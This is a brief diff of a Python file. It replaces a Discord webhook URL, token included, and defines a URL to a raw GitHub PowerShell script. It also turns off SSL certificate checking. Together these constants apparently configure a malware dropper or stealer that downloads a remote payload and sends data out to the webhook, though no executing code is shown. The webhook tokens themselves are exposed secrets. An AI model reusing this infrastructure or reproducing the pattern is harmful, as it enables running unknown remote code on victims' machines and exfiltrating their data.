@@ -5,7 +5,7 @@ import os
 import json
 import ssl
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1421777351263522886/5bDMcVkeMYaC16qHofB8ucS0qX9t_IyaBkCz9Q0tjZGJypVmzG-2lAj7q7QOgFLnI7AD'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1418620647654953144/quGfUxYm_ZNxydSkulCZd2NGHsrHdfIm0h5J9gM5R0FQyrdsQRecWTTMaI3Mff3cWQzU'
 SCRIPT_URL = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/1.ps1'
 
 ssl._create_default_https_context = ssl._create_unverified_context
